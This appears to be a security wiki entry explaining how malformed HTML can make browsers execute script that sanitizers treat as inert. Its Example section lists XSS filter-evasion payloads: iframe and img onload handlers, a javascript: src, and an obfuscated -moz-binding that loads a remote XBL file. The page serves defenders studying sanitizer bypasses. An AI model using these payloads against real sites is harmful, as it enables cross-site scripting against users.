# Malformed HTML Can Hide Scripts #

## Effect ##
Malformed HTML can cause browsers to treat plain text, attribute names, or other content as the content of a script or style tag or attribute, effectively embedding unsanitized script or markup.


## Background ##
There are various HTML and XHTML schemas but all browsers will accept an arbitrary string and try their best to interpret as HTML.  There is no standard for how to interpret a malformed string as HTML.

HTML validators that allow malformed markup run the risk that the browser will interpret the markup differently, possibly interpreting something they thought was user visible text, as a script to execute.

Malformed HTML comes in various flavors
  * lexical errors
    * failing to close a quoted string or comment
    * failure to escape HTML special characters
    * illegal characters in a tag name, attribute name, or comment, e.g. foo/bar=baz
    * non-standard comment ending, e.g. `<!-- foo -- bar>`
  * undefined tags or attributes
  * missing end tags
  * tags that aren't allowed to appear in the context in which they appear
Lexical errors and missing end tags can cause a passage of text to be interpreted as a script when it shouldn't be.  Undefined tags or attributes can trigger proprietary browser extensions with undefined results.

## Assumptions ##
An HTML rewriter outputs malformed HTML, or an HTML validator passes malformed HTML.


## Versions ##
All


## Example ##
Collin Jackson's examples
```
<div x="\"><img onload=alert(42)
src=http://json.org/img/json160.gif>"></div>

<iframe/src="javascript:alert(42)"></iframe>
```

Gareth's examples
```
<iframe/ /onload=alert(/XSS/)></iframe>
<iframe/ "onload=alert(/XSS/)></iframe>
<iframe///////onload=alert(/XSS/)></iframe>
<iframe "onload=alert(/XSS/)></iframe>
<iframe<?php echo chr(11)?> onload=alert(/XSS/)></iframe>
<iframe<?php echo chr(12)?> onload=alert(/XSS/)></iframe>
<div&nbsp &nbsp style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk
\/labs\/xbl\/xbl\.xml\#xss)>
```

Also
```
<img title=="><script>alert('foo')</script>">
```
and countless others.